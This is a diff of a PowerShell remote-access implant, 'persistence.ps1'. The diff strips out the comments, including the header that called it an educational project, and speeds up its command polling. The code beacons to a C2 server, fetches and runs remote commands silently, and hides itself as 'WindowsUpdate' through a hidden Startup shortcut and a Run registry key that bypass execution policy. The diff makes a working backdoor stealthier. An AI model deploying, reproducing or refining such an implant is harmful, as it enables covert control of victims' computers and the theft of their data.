@@ -1,13 +1,8 @@
-# persistence.ps1
-# Educational Cybersecurity Project - Remote Access Script
-
-# Configuratie - VERANDER DEZE URL
 $workerUrl = "https://your-app-name.onrender.com"
 $scriptName = "WindowsUpdate.ps1"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $scriptPath = "$env:APPDATA\$scriptName"
 
-# Functie: Beacon naar C2
 function Send-Beacon {
     param($data)
     try {
@@ -29,11 +24,9 @@ function Send-Beacon {
         
         Invoke-RestMethod @params | Out-Null
     } catch {
-        # Silent fail - geen errors tonen
     }
 }
 
-# Functie: Poll voor commands
 function Get-Command {
     try {
         $params = @{
@@ -50,7 +43,6 @@ function Get-Command {
     }
 }
 
-# Functie: Execute command
 function Invoke-RemoteCommand {
     param($cmd)
     try {
@@ -69,23 +61,19 @@ function Invoke-RemoteCommand {
     }
 }
 
-# Installeer persistence
 function Install-Persistence {
     try {
-        # Kopieer script naar AppData
         if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
             Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
         }
         
-        # Maak startup shortcut
         $WshShell = New-Object -ComObject WScript.Shell
         $Shortcut = $WshShell.CreateShortcut("$startupPath\WindowsUpdate.lnk")
         $Shortcut.TargetPath = "powershell.exe"
         $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-        $Shortcut.WindowStyle = 7 # Hidden
+        $Shortcut.WindowStyle = 7
         $Shortcut.Save()
         
-        # Registry persistence (backup methode)
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" `
             -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force
@@ -102,14 +90,11 @@ function Install-Persistence {
     }
 }
 
-# Main loop
 function Start-C2Client {
-    # Installeer persistence bij eerste run
     if (-not (Test-Path $scriptPath)) {
         Install-Persistence
     }
     
-    # Stuur initial beacon
     Send-Beacon -data @{
         type = "init"
         message = "Client connected"
@@ -117,17 +102,15 @@ function Start-C2Client {
         psversion = $PSVersionTable.PSVersion.ToString()
     }
     
-    # Command polling loop
     while ($true) {
         try {
             $cmd = Get-Command
             if ($cmd) {
                 Invoke-RemoteCommand -cmd $cmd
             }
-            Start-Sleep -Seconds 5  # Poll elke 5 seconden
+            Start-Sleep -Seconds 2
         } catch {
-            # Continue bij errors
-            Start-Sleep -Seconds 10
+            Start-Sleep -Seconds 5
         }
     }
 }
